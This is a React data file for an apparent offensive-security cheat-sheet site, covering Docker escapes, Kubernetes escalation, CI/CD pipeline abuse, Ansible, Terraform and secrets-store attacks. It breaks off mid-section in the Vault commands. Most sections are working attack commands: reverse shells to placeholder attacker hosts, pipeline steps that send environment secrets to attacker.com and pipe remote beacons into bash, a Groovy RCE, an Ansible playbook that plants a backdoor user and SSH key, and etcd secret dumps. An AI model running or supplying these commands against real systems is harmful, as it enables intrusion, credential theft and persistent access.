import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'DOCKER',
    color: 'blue',
    nodes: [
      { title: 'Container Escape', subtitle: 'Privileged • socket mount • namespace', id: 'docker-escape' },
      { title: 'Docker Enumeration', subtitle: 'Image analysis • env vars • secrets', id: 'docker-enum' },
    ]
  },
  {
    header: 'KUBERNETES',
    color: 'cyan',
    nodes: [
      { title: 'K8s Enumeration', subtitle: 'kubectl • RBAC • service accounts', id: 'k8s-enum' },
      { title: 'K8s Escalation', subtitle: 'Pod creation • SA token abuse • etcd', id: 'k8s-privesc' },
    ]
  },
  {
    header: 'CI/CD PIPELINES',
    color: 'orange',
    nodes: [
      { title: 'Jenkins', subtitle: 'Groovy script console • credential store', id: 'jenkins' },
      { title: 'GitHub Actions', subtitle: 'Workflow injection • secret exfil • OIDC', id: 'github-actions' },
      { title: 'GitLab CI', subtitle: 'Runner abuse • variable exfil • pipeline', id: 'gitlab-ci' },
    ]
  },
  {
    header: 'CONFIG MGMT',
    color: 'purple',
    nodes: [
      { title: 'Ansible', subtitle: 'Playbook abuse • vault decrypt • inventory', id: 'ansible' },
      { title: 'Terraform', subtitle: 'State file • credentials • provider abuse', id: 'terraform' },
    ]
  },
  {
    header: 'CLOUD SECRETS',
    color: 'red',
    nodes: [
      { title: 'Secrets Management', subtitle: 'HashiCorp Vault • AWS SSM • env injection', id: 'secrets-mgmt' },
      { title: 'AWS Attack Surface', subtitle: 'IMDS • IAM • S3 • SSM • Lambda • EC2', id: 'aws-cloud' },
      { title: 'GCP Attack Surface', subtitle: 'Metadata API • SA keys • GCS • Cloud Run', id: 'gcp-cloud' },
      { title: 'Azure Attack Surface', subtitle: 'IMDS • MSI • KeyVault • Storage • AD', id: 'azure-cloud' },
    ]
  },
];

const techniques = [
  {
    id: 'docker-escape',
    title: 'Docker Container Escape',
    subtitle: 'Break out of Docker containers to gain access to the host system',
    tags: ['privileged container', 'docker.sock', 'namespace escape', 'cgroup release_agent', 'runc CVE'],
    accentColor: 'blue',
    overview: 'Docker container escape techniques exploit misconfigurations that break the container isolation boundary. A privileged container (--privileged) has all Linux capabilities and can mount host devices directly. A mounted docker.sock lets you spawn new privileged containers from within the current one. The cgroup release_agent technique writes a host-side executable path to the notify_on_release file, triggering code execution on the host when the cgroup is released. The runc CVE-2019-5736 overwrites the host runc binary itself during exec.',
    steps: [
      'ENUMERATE: check capabilities (capsh --decode), look for /.dockerenv, inspect /proc/1/cgroup for docker/k8s markers',
      'CHECK PRIVILEGED: CapEff bitmask 0000003fffffffff = full caps — if privileged, directly mount host disks',
      'CHECK DOCKER SOCKET: ls /var/run/docker.sock — if present, use docker API/CLI to create a new privileged container with host / mounted',
      'CGROUP RELEASE AGENT: if cap_sys_admin is present — mount cgroup, set release_agent to a reverse shell script, trigger via cgroup.procs',
      'PRIVILEGED ESCAPE: fdisk -l to find host disk, mount /dev/sdX to /mnt/host, chroot /mnt/host — now operating as root on host',
      'RUNC CVE-2019-5736: overwrite host runc binary during exec into container — requires root inside container and runc < 1.0-rc6',
    ],
    commands: [
      {
        title: 'Container escape techniques',
        code: `# Check container security context
cat /proc/1/status | grep CapEff   # Capability bitmask
# CapEff: 0000003fffffffff = full capabilities (privileged)
capsh --decode=0000003fffffffff

# Check for docker.sock mount
ls /var/run/docker.sock
mount | grep docker

# Docker socket escape — create new privileged container mounting host
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Create privileged container with host root mounted:
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# Or with docker CLI (if installed inside container)
docker run -v /:/host -it --rm alpine chroot /host sh

# cgroup release_agent escape (privileged container or cap_sys_admin)
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Privileged container — mount host filesystem
# If --privileged, all devices accessible
fdisk -l   # List host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host   # Mount host root disk
chroot /mnt/host /bin/bash  # Chroot into host

# Detect container environment
cat /.dockerenv              # Exists in Docker containers
cat /proc/1/cgroup | grep docker
env | grep -i "docker\|container\|kube"`
      }
    ]
  },
  {
    id: 'docker-enum',
    title: 'Docker Image & Container Enumeration',
    subtitle: 'Extract secrets, credentials, and sensitive data from Docker images and running containers',
    tags: ['docker inspect', 'ENV vars', 'image layers', 'history', 'volumes', 'secrets'],
    accentColor: 'blue',
    overview: 'Docker images and running containers are a rich source of credentials and sensitive configuration. Environment variables are the most common location for database passwords, API keys, and service tokens — docker inspect or env inside the container reveals them immediately. Image layers preserve history: every RUN command and deleted file still exists in prior layers. docker history --no-trunc shows the full build commands, which developers frequently use to pass secrets. The ~/.docker/config.json on the host stores registry auth tokens.',
    steps: [
      'LIST containers and images: docker ps -a, docker images — identify running services and their image versions',
      'DUMP ENV VARS: docker inspect <ID> | jq .[0].Config.Env — look for *_PASSWORD, *_TOKEN, *_KEY, DATABASE_URL patterns',
      'CHECK VOLUME MOUNTS: docker inspect <ID> | jq .[0].HostConfig.Binds — sensitive host paths mounted in?',
      'LAYER ANALYSIS: docker history --no-trunc <IMAGE> — full RUN commands may contain secrets passed as build args',
      'EXPORT AND INSPECT: docker save <IMAGE> | tar x — extract and grep each layer.tar for passwd, shadow, key, cred',
      'REGISTRY AUTH: cat ~/.docker/config.json — base64-encoded registry credentials for Docker Hub and private registries',
    ],
    commands: [
      {
        title: 'Docker enumeration and secret extraction',
        code: `# List running containers and images
docker ps -a
docker images

# Inspect container configuration
docker inspect <CONTAINER_ID>
docker inspect <CONTAINER_ID> | jq '.[0].Config.Env'   # Environment variables
docker inspect <CONTAINER_ID> | jq '.[0].HostConfig.Binds'   # Volume mounts
docker inspect <CONTAINER_ID> | jq '.[0].NetworkSettings'    # Network config

# Get shell in running container
docker exec -it <CONTAINER_ID> /bin/sh

# Environment variables (often contain credentials)
docker exec <CONTAINER_ID> env
# or from inside container:
env | grep -i "pass\|secret\|key\|token\|db\|url\|host"

# Image layer analysis
docker history <IMAGE>        # Show build history
docker history --no-trunc <IMAGE>   # Full commands (reveals secrets in RUN)

# Dive — interactive layer inspector
dive <IMAGE>   # Browse filesystem changes per layer

# Export image and inspect all layers
docker save <IMAGE> -o image.tar
tar xf image.tar
# Inspect each layer:
for layer in */layer.tar; do tar tf $layer; done | grep -i "passwd\|shadow\|key\|cred"

# Extract files from image
docker create --name tmp <IMAGE>
docker cp tmp:/etc/passwd ./passwd
docker rm tmp

# Check for secrets in container filesystem
docker exec <CONTAINER> find / -name "*.env" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
docker exec <CONTAINER> cat /app/.env

# Registry authentication (steal credentials)
cat ~/.docker/config.json   # Docker Hub / registry auth tokens
cat /root/.docker/config.json`
      }
    ]
  },
  {
    id: 'k8s-enum',
    title: 'Kubernetes Enumeration',
    subtitle: 'Enumerate Kubernetes cluster resources, permissions, and service account tokens',
    tags: ['kubectl', 'RBAC', 'service account', 'token', 'namespaces', 'secrets', 'ClusterRole'],
    accentColor: 'cyan',
    overview: 'Every Kubernetes pod has a service account token automatically mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. This token authenticates to the Kubernetes API server and may have overly permissive RBAC bindings. kubectl auth can-i --list reveals the full permission set of the current SA. Secrets in accessible namespaces frequently contain database passwords, API keys, and TLS certificates. The kubelet API on port 10250 is often unauthenticated and exposes pod listings and exec endpoints directly without going through the API server.',
    steps: [
      'READ MOUNTED TOKEN: cat /var/run/secrets/kubernetes.io/serviceaccount/token — always present in pods unless explicitly disabled',
      'TEST API ACCESS: curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces',
      'ENUMERATE PERMISSIONS: kubectl auth can-i --list — see exactly what the current SA can do across all API groups',
      'LIST SECRETS: kubectl get secrets --all-namespaces — if allowed, read with kubectl get secret <NAME> -o yaml and base64 -d',
      'FIND PRIVILEGED SAS: kubectl get clusterrolebindings -o json | jq to find SAs bound to cluster-admin',
      'CHECK KUBELET: curl -sk https://NODE_IP:10250/pods — often unauthenticated; also try /runningpods and /exec endpoints',
    ],
    commands: [
      {
        title: 'Kubernetes enumeration techniques',
        code: `# From inside a pod — access K8s API using mounted token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Test API access
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Using kubectl (if available in pod or from outside)
kubectl auth can-i --list   # List all permissions of current SA
kubectl auth can-i create pods
kubectl auth can-i get secrets

# Enumerate cluster resources
kubectl get all --all-namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get clusterrolebindings

# Read secrets (if allowed)
kubectl get secret <SECRET_NAME> -o yaml
kubectl get secret <SECRET_NAME> -o jsonpath='{.data}' | base64 -d

# Find highly privileged service accounts
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# kubeletctl — interact with kubelet API directly (often unauthenticated on port 10250)
curl -sk https://NODE_IP:10250/pods | jq .
curl -sk https://NODE_IP:10250/runningpods | jq .

# kube-hunter — automated K8s vulnerability scanner
docker run --rm -it aquasec/kube-hunter --remote NODE_IP
kube-hunter --pod     # Run from inside a pod

# Get ETCD address (often has all cluster secrets unencrypted)
kubectl get pods -n kube-system | grep etcd`
      }
    ]
  },
  {
    id: 'k8s-privesc',
    title: 'Kubernetes Privilege Escalation',
    subtitle: 'Escalate privileges in Kubernetes via pod creation, SA token abuse, and etcd access',
    tags: ['privileged pod', 'hostPID', 'hostPath', 'SA token', 'etcd', 'node shell', 'RBAC escalation'],
    accentColor: 'cyan',
    overview: 'If the current service account has the "create pods" verb, cluster ownership is trivial: deploy a pod with hostPID:true, hostNetwork:true, and a hostPath volume mounting / — then chroot /host for a root shell on the underlying node. From any node, etcd can be queried directly to dump all cluster secrets in plaintext (etcd does not encrypt at rest by default). RBAC impersonation (if the SA has impersonate verbs) allows acting as any user including cluster-admin without needing their token.',
    steps: [
      'CHECK CREATE PODS: kubectl auth can-i create pods — if yes, deploy a privileged pod with hostPath:/ and chroot to escape to node',
      'STEAL SA TOKENS: kubectl exec -it <privileged-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token — pivot to higher-priv SA',
      'ETCD DUMP: from master node, use etcdctl with cluster certs to dump /registry/secrets — returns all K8s secrets unencrypted',
      'RBAC IMPERSONATION: kubectl get secrets --as=system:serviceaccount:kube-system:default — act as any SA if impersonate verb is granted',
      'ROLEBINDING ESCALATION: kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default',
      'NODE SHELL: kubectl debug node/NODE_NAME -it --image=ubuntu then chroot /host — root shell on the underlying node (K8s 1.18+)',
    ],
    commands: [
      {
        title: 'Kubernetes privilege escalation',
        code: `# Create privileged pod with host filesystem mounted
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "tail -f /dev/null"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Get shell in the pod and escape to host
kubectl exec -it attacker-pod -- /bin/sh
chroot /host /bin/bash   # Now on the node as root

# Steal service account token from privileged pod
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use that token:
export TOKEN=<STOLEN_TOKEN>
kubectl --token=$TOKEN auth can-i --list

# etcd direct access (from master node or if etcd is exposed)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only

# Get all secrets from etcd
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix | strings | grep -A5 "password\|token"

# RBAC impersonation
kubectl get secrets --as=system:serviceaccount:kube-system:default
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default

# Node shell (kubectl debug — K8s 1.18+)
kubectl debug node/NODE_NAME -it --image=ubuntu
chroot /host /bin/bash`
      }
    ]
  },
  {
    id: 'jenkins',
    title: 'Jenkins Attack & Exploitation',
    subtitle: 'Exploit Jenkins for code execution, credential theft, and pipeline abuse',
    tags: ['Groovy Script Console', 'credential store', 'build executor', 'pipeline', 'JNLP agent', 'Jenkins CLI'],
    accentColor: 'orange',
    overview: 'Jenkins is one of the most commonly misconfigured systems in enterprise environments. The Script Console at /script executes arbitrary Groovy code in the Jenkins JVM process — trivial RCE if exposed. Jenkins stores credentials (SSH keys, API tokens, passwords) encrypted with a master key derived from secrets/master.key and secrets/hudson.util.Secret. Offline decryption is possible if you can read those files. Injecting a malicious Jenkinsfile into any repository triggers pipeline execution on the next build, with full access to injected secrets.',
    steps: [
      'PROBE: curl http://jenkins:8080/api/json — anonymous access? Check /script and /manage for admin panel exposure',
      'SCRIPT CONSOLE RCE: navigate to Manage Jenkins > Script Console — execute Groovy: ["bash","-c","id"].execute().text',
      'DUMP CREDENTIALS: use Groovy via Script Console to iterate the credential store and decrypt all stored passwords and API tokens',
      'OFFLINE DECRYPTION: if you have Jenkins home dir, grab secrets/master.key + secrets/hudson.util.Secret + credentials.xml — decrypt offline with jenkins-decrypt.py',
      'PIPELINE INJECTION: modify the Jenkinsfile in a target repository to add a step that exfiltrates env (all injected secrets) to attacker URL',
      'BUILD LOG HARVEST: curl /job/PROJECT/lastBuild/consoleText — build logs often contain credentials echoed by developers',
    ],
    commands: [
      {
        title: 'Jenkins exploitation techniques',
        code: `# Check for anonymous access
curl http://jenkins.corp.local:8080/api/json
curl http://jenkins.corp.local:8080/script   # Script console (if accessible)

# Script Console — Groovy RCE (Jenkins admin)
# Navigate to: Manage Jenkins → Script Console
# Execute:
println "whoami".execute().text
println ["bash", "-c", "id"].execute().text
["bash", "-c", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"].execute()

# Decrypt Jenkins credentials
# Method 1: via Groovy Script Console
import hudson.util.Secret
def credStore = jenkins.model.Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
credStore.getCredentials(com.cloudbees.plugins.credentials.domains.Domain.global()).each { cred ->
  println cred.id + " : " + cred.password?.plainText
}

# Method 2: offline decryption (if you have Jenkins home dir)
# Files needed: secrets/master.key, secrets/hudson.util.Secret
# Tool: jenkins-decrypt.py
python3 jenkins-decrypt.py master.key hudson.util.Secret credentials.xml

# Jenkins CLI (if accessible)
java -jar jenkins-cli.jar -s http://jenkins.corp.local:8080/ -auth user:pass who-am-i
java -jar jenkins-cli.jar -s http://jenkins.corp.local:8080/ -auth user:pass groovy =   < cmd.groovy

# Malicious Jenkinsfile (inject into repository)
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        sh 'env | curl -X POST -d @- http://ATTACKER/exfil'  // Exfil all env vars/secrets
        sh 'curl -s http://ATTACKER/beacon | bash'
      }
    }
  }
}

# Access build logs (may contain credentials printed to console)
curl http://jenkins.corp.local:8080/job/project/lastBuild/consoleText -u user:pass`
      }
    ]
  },
  {
    id: 'github-actions',
    title: 'GitHub Actions — Pipeline & Secret Exfiltration',
    subtitle: 'Abuse GitHub Actions workflows for secret exfiltration and pipeline injection',
    tags: ['GITHUB_TOKEN', 'secrets', 'workflow injection', 'OIDC', 'pull request', 'environment'],
    accentColor: 'orange',
    overview: 'GitHub Actions workflows execute with access to repository secrets (${{ secrets.* }}) and the automatic GITHUB_TOKEN. The pull_request_target trigger is particularly dangerous: it runs with write permissions and access to secrets even for PRs from forks — if the workflow checks out untrusted PR code and uses it in shell steps, it is trivially injectable. OIDC integration allows workflows to obtain short-lived cloud provider credentials (AWS, GCP, Azure) without storing static keys — if the trust policy is too broad, any attacker-controlled repo can assume the cloud role.',
    steps: [
      'ENUMERATE: find .github/workflows/*.yml — identify triggers (push, pull_request_target, workflow_dispatch), permissions, and secret references',
      'INJECT VIA WORKFLOW: add a step to an existing workflow or create a new one — exfiltrate env | base64 to attacker URL to capture all secrets',
      'PULL_REQUEST_TARGET INJECTION: submit a PR that modifies a script path referenced by a pull_request_target workflow — the PR code runs with repo-level secrets',
      'GITHUB_TOKEN ABUSE: use the automatic token to read other repos, create releases, modify branch protections, or pivot to other workflows',
      'OIDC CREDENTIAL THEFT: if id-token: write permission exists and cloud OIDC is configured, request short-lived cloud credentials within the workflow',
      'SELF-HOSTED RUNNER: add a workflow step with a reverse shell or beacon download — self-hosted runners execute on internal infrastructure',
    ],
    commands: [
      {
        title: 'GitHub Actions attack techniques',
        code: `# Enumerate workflow files
ls .github/workflows/
cat .github/workflows/ci.yml

# Secret exfiltration via malicious workflow step
# Add to existing workflow or create new one:
- name: Exfil
  run: |
    env | base64 | curl -X POST https://attacker.com/ -d @-
    echo "$\{{ secrets.AWS_ACCESS_KEY_ID }}" | curl -X POST https://attacker.com/key -d @-

# Inject into pull_request_target workflow (classic injection)
# Workflow that checks out PR code and uses it insecurely:
# - uses: actions/checkout@v3
#   with:
#     ref: $\{{ github.event.pull_request.head.ref }}   # <- untrusted!
# Submit PR with malicious script in the workflow path

# OIDC cloud credential abuse
# If workflow has id-token: write permission and cloud OIDC is configured:
- name: Get AWS creds via OIDC
  uses: aws-actions/configure-aws-credentials@v2
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/GitHubActions
    aws-region: us-east-1
- run: aws sts get-caller-identity  # Now have AWS access

# Self-hosted runner compromise
# Workflow runs on runner machine — get shell via:
- name: Backdoor
  run: |
    curl http://ATTACKER/beacon | bash

# GITHUB_TOKEN abuse (read other repos, create releases, modify code)
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/ORG/REPO/contents/ | jq '.[].name'

# List all secrets (if you have admin access)
gh secret list --repo ORG/REPO
gh api repos/ORG/REPO/actions/secrets`
      }
    ]
  },
  {
    id: 'gitlab-ci',
    title: 'GitLab CI/CD — Runner & Variable Abuse',
    subtitle: 'Exploit GitLab CI pipelines for secret exfiltration, runner abuse, and lateral movement',
    tags: ['CI_JOB_TOKEN', 'CI variables', 'runner', 'pipeline injection', 'protected branch', 'GitLab API'],
    accentColor: 'orange',
    overview: 'GitLab CI automatically injects a CI_JOB_TOKEN into every pipeline job, which grants API access to other group projects. CI/CD variables (Settings > CI/CD > Variables) are the primary credential store — masked variables hide values in logs but they are still accessible in the job environment. Protected variables are restricted to protected branches, but if you can push to a protected branch (or unprotect one via API), you can trigger a pipeline with access to those secrets. Self-hosted or shared runners execute on actual infrastructure, making workflow injection a direct path to internal network access.',
    steps: [
      'ENUMERATE: read .gitlab-ci.yml — identify stages, variables referenced, and runner tags; check project CI/CD settings for exposed variable names',
      'INJECT VIA PIPELINE: push a modified .gitlab-ci.yml (or fork and open an MR) with a step that exfiltrates env — captures all CI variables including tokens',
      'CI_JOB_TOKEN ABUSE: use the token to call GitLab API (/api/v4/projects) and download source code from any accessible group project',
      'UNPROTECT BRANCH (if admin): DELETE /api/v4/projects/ID/protected_branches/main — now pipelines on main can access protected variables without restrictions',
      'ROGUE RUNNER: if you obtain a runner registration token, register a malicious runner tagged to match production jobs — your runner executes production pipeline steps',
      'CONTAINER REGISTRY: docker login with CI_JOB_TOKEN → pull production images → docker inspect for env vars and secrets baked into image layers',
    ],
    commands: [
      {
        title: 'GitLab CI/CD attack techniques',
        code: `# Exfiltrate CI variables via malicious .gitlab-ci.yml
exfil-secrets:
  script:
    - env | base64 | curl -X POST https://attacker.com/exfil -d @-
    - echo "$CI_JOB_TOKEN" | curl -X POST https://attacker.com/token -d @-
    - curl -H "PRIVATE-TOKEN: $SECRET_TOKEN" https://gitlab.corp.local/api/v4/projects

# CI_JOB_TOKEN — access GitLab API
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.corp.local/api/v4/projects"

# List all groups accessible
curl -H "PRIVATE-TOKEN: <TOKEN>" https://gitlab.corp.local/api/v4/groups

# Download other project repositories
curl -H "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.corp.local/api/v4/projects/PROJECT_ID/repository/archive"

# Runner registration token (if you have admin access — register rogue runner)
curl -H "PRIVATE-TOKEN: <admin-token>" \
  "https://gitlab.corp.local/api/v4/runners/registration_token"
# Register rogue runner:
gitlab-runner register \
  --url https://gitlab.corp.local \
  --registration-token RUNNER_TOKEN \
  --executor shell \
  --tag-list "production,deploy"

# Protect branch bypass (unprotect → get variables → reprotect)
curl -H "PRIVATE-TOKEN: <TOKEN>" -X DELETE \
  "https://gitlab.corp.local/api/v4/projects/PROJECT_ID/protected_branches/main"
# Now pipeline on 'main' runs without protected variable restrictions

# GitLab container registry (often has image pull credentials)
docker login gitlab.corp.local:5050 -u user -p $CI_JOB_TOKEN
docker pull gitlab.corp.local:5050/group/project:latest
docker inspect gitlab.corp.local:5050/group/project:latest | jq '.[0].Config.Env'`
      }
    ]
  },
  {
    id: 'ansible',
    title: 'Ansible Attack & Credential Extraction',
    subtitle: 'Exploit Ansible for credential extraction, lateral movement, and playbook abuse',
    tags: ['ansible-vault', 'inventory', 'become', 'host_vars', 'group_vars', 'ANSIBLE_VAULT_PASSWORD'],
    accentColor: 'purple',
    overview: 'Ansible controllers are high-value targets because they hold SSH credentials and run as root (via become: yes) across entire infrastructure fleets. The inventory file lists every managed host, often with ansible_ssh_pass or ansible_password in plaintext or encrypted with ansible-vault. The vault password is frequently stored in a .vault_pass file, an environment variable (ANSIBLE_VAULT_PASSWORD_FILE), or hardcoded in CI pipeline variables. Compromising the Ansible controller is effectively a one-command path to root on every managed server via ansible all -m shell -a "..." --become.',
    steps: [
      'LOCATE FILES: find / -name ansible.cfg -o -name inventory -o -name "*.yml" 2>/dev/null — identify controller node and inventory locations',
      'READ INVENTORY: cat /etc/ansible/hosts or inventory.ini — lists all managed hosts; look for ansible_ssh_pass and ansible_password fields',
      'FIND VAULT PASSWORD: check ansible.cfg for vault_password_file, grep env for ANSIBLE_VAULT_PASSWORD, find .vault_pass files',
      'DECRYPT VAULT: ansible-vault decrypt --vault-password-file .vault_pass encrypted.yml — or crack with ansible2john + hashcat/john',
      'EXECUTE ON ALL HOSTS: ansible all -m shell -a "whoami" --become — confirms root access across all managed systems',
      'DEPLOY BACKDOOR: ansible-playbook pwn.yml --vault-password-file .vault_pass — add SSH key to root, create backdoor user, or drop beacon',
    ],
    commands: [
      {
        title: 'Ansible exploitation techniques',
        code: `# Find Ansible files
find / -name "ansible.cfg" -o -name "*.yml" -path "*/ansible/*" 2>/dev/null
find / -name "inventory" -o -name "hosts" -path "*/ansible/*" 2>/dev/null

# Read inventory — contains all managed hosts
cat /etc/ansible/hosts
cat inventory
cat inventory.ini

# Look for credentials in host_vars and group_vars
find . -name "*.yml" | xargs grep -l "ansible_ssh_pass\|ansible_password\|vault_"
cat group_vars/all.yml
cat host_vars/TARGET.yml

# Find vault password file
find / -name ".vault_pass" -o -name "vault_password_file" 2>/dev/null
cat ansible.cfg | grep vault_password_file
env | grep -i vault

# Decrypt ansible-vault encrypted string
ansible-vault decrypt --vault-password-file .vault_pass encrypted_file.yml
# Or crack vault password:
# Extract vault header: $ANSIBLE_VAULT;1.1;AES256
ansible2john vault.yml > vault.hash
john --wordlist=rockyou.txt vault.hash

# Run ad-hoc command on all hosts (from controller)
ansible all -m shell -a "whoami" --become
ansible all -m shell -a "cat /etc/shadow" --become
ansible all -m shell -a "curl http://ATTACKER/beacon | bash" --become

# Malicious playbook (if you can write/modify playbooks)
cat > pwn.yml << 'EOF'
- hosts: all
  become: yes
  tasks:
    - name: Add backdoor user
      user:
        name: svc_backup
        password: "{{ 'Backdoor123!' | password_hash('sha512') }}"
        groups: sudo
        shell: /bin/bash
    - name: Add SSH key
      authorized_key:
        user: root
        key: "ssh-rsa ATTACKER_PUB_KEY"
EOF
ansible-playbook pwn.yml --vault-password-file .vault_pass`
      }
    ]
  },
  {
    id: 'terraform',
    title: 'Terraform State & Credential Abuse',
    subtitle: 'Extract credentials and sensitive data from Terraform state files and configurations',
    tags: ['terraform.tfstate', 'backend', 'S3 state', 'provider credentials', 'tfvars', 'workspace'],
    accentColor: 'purple',
    overview: 'Terraform state files (terraform.tfstate) are JSON documents containing the complete current state of managed infrastructure — including all resource attributes, which frequently include database passwords, connection strings, generated API keys, and TLS certificates in plaintext. Remote state stored in S3/GCS/Azure Blob is often protected only by IAM/ACL policies. If you compromise a cloud role with S3 read access, you can download state for all workspaces. Terraform Cloud workspace variables are the credential store for many organisations — accessible via a stolen user/team token.',
    steps: [
      'FIND STATE FILES: find / -name "*.tfstate" -o -name "*.tfvars" 2>/dev/null — local state is often committed to repos by mistake',
      'PARSE LOCAL STATE: cat terraform.tfstate | jq .resources[].instances[].attributes — extract passwords, connection strings, generated secrets',
      'REMOTE STATE (S3): aws s3 cp s3://BUCKET/terraform/terraform.tfstate /tmp/ — then jq to extract db passwords, API keys from resource attributes',
      'TFVARS EXTRACTION: grep -i "key\\|secret\\|password\\|token" *.tfvars *.auto.tfvars — variables passed at plan/apply time, often contain cloud credentials',
      'PROVIDER HARDCODED CREDS: grep -r "access_key\\|secret_key\\|client_secret" *.tf — providers sometimes have credentials hardcoded',
      'TERRAFORM CLOUD API: GET /api/v2/workspaces/WS_ID/vars with stolen token — workspace variables contain cloud provider credentials used for provisioning',
    ],
    commands: [
      {
        title: 'Terraform credential extraction',
        code: `# Find Terraform files
find / -name "*.tfstate" -o -name "*.tfvars" -o -name "terraform.tf" 2>/dev/null

# Read local state (often contains plaintext secrets)
cat terraform.tfstate | jq .
cat terraform.tfstate | jq '.resources[].instances[].attributes'

# Extract sensitive outputs
terraform show -json | jq '.values.outputs'

# Remote state — S3 backend
aws s3 ls s3://BUCKET/terraform/
aws s3 cp s3://BUCKET/terraform/terraform.tfstate /tmp/
cat /tmp/terraform.tfstate | jq '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | {password, username, endpoint}'

# GCS state backend
gsutil cat gs://BUCKET/terraform/default.tfstate | jq .

# Azure blob state
az storage blob download --container-name tfstate --name terraform.tfstate --file state.json

# .tfvars credential extraction
cat terraform.tfvars
cat *.auto.tfvars
# Look for:
grep -i "key\|secret\|password\|token\|credential" *.tfvars

# Provider config with hardcoded creds
grep -r "access_key\|secret_key\|client_secret\|subscription_id" *.tf

# Terraform Cloud API (if you have user/team token)
curl -H "Authorization: Bearer $TERRAFORM_CLOUD_TOKEN" \
  https://app.terraform.io/api/v2/organizations/ORG/workspaces | jq '.data[].id'
# Get workspace vars (may contain cloud creds)
curl -H "Authorization: Bearer $TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/vars" | jq '.data[].attributes'

# Terraform state manipulation (if you have write access — backdoor infrastructure)
terraform state pull > current.tfstate
# Modify current.tfstate to add your SSH key to existing resources
terraform state push modified.tfstate`
      }
    ]
  },
  {
    id: 'secrets-mgmt',
    title: 'Secrets Management Exploitation',
    subtitle: 'Exploit HashiCorp Vault, AWS SSM, and misconfigured secret stores to extract credentials',
    tags: ['HashiCorp Vault', 'AWS SSM', 'AWS Secrets Manager', 'env injection', 'token', 'AppRole'],
    accentColor: 'red',
    overview: 'Secrets management systems are valuable targets because they centralise all credentials. HashiCorp Vault tokens are commonly leaked in environment variables, ~/.vault-token, or process environ — a stolen token with list+read policies gives access to every secret path it covers. AWS IMDS (169.254.169.254) on any EC2 instance provides temporary IAM role credentials that are valid for the role\'s full permission set — including access to SSM Parameter Store and Secrets Manager. IMDSv1 requires no pre-authentication; IMDSv2 requires a one-step PUT to get a session token first.',
    steps: [
      'VAULT TOKEN HUNT: echo $VAULT_TOKEN, cat ~/.vault-token, grep /proc/*/environ for VAULT_TOKEN — service processes commonly have it in their environment',
      'VAULT SECRET DUMP: vault secrets list then vault kv list secret/ and vault kv get secret/DATABASE — enumerate and read all accessible paths',
      'AWS IMDS (IMDSv1): curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME — instant temporary credentials, no auth required',
      'AWS IMDS (IMDSv2): first PUT to /latest/api/token with TTL header → use returned token in X-aws-ec2-metadata-token header for credential request',
      'AWS SSM: aws ssm get-parameters-by-path --path / --recursive --with-decryption — dumps all SSM parameters including SecureString values',
      'AWS SECRETS MANAGER: aws secretsmanager list-secrets then get-secret-value --secret-id NAME — retrieves database passwords, API keys, TLS private keys',
    ],
    commands: [
      {
        title: 'Secrets management exploitation',
        code: `# HashiCorp Vault
# Find Vault token
echo $VAULT_TOKEN
cat ~/.vault-token
grep -r "VAULT_TOKEN\|vault_token" /etc /app /home 2>/dev/null

# Check Vault token from process env (root)
for pid in $(pgrep -f vault); do
  cat /proc/$pid/environ | tr '\\0' '\\n' | grep VAULT
done

# Vault API — list and read secrets (with stolen token)
export VAULT_TOKEN=<STOLEN_TOKEN>
vault secrets list
